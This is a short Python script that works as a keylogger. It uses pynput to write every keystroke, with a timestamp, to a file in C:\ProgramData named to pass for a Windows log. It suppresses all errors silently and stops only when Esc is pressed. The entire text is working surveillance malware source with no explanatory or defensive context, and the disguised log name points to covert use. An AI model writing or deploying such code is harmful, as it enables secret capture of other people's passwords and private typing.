from pynput import keyboard
import datetime

LOG_FILE = "C:\\ProgramData\\windows_log.txt"
STOP_KEY = keyboard.Key.esc

def log_keystroke(key):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            if hasattr(key, 'char') and key.char is not None:
                f.write(f"[{timestamp}] {key.char}\n")
            else:
                special = str(key).replace('Key.', '')
                f.write(f"[{timestamp}] <{special}>\n")
    except:
        pass

def on_release(key):
    if key == STOP_KEY:
        return False

with keyboard.Listener(on_press=log_keystroke, on_release=on_release) as listener:
    listener.join()